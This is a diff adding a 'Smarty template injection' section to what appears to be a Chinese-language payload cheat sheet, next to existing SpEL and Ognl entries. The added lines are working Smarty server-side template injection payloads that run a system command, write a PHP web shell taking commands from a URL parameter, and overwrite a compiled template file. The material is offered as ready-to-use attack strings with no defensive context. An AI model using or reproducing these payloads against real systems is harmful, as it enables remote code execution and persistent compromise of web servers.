@@ -158,6 +158,19 @@ T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager)
 
 ```
 
+## Smarty 模板注入
+```
+string:{$smarty.template_object->smarty->setCacheDir('./x')->display('string:{system(whoami)}')}
+
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+
+string:{$s=$smarty.template_object->smarty}{$fp=$smarty.template_object->compiled->filepath}{Smarty_Internal_Runtime_WriteFile::writeFile($fp,"<?php phpinfo();",$s)}
+
+
+
+```
+
+
 
 # Ognl 表达式注入
 ```
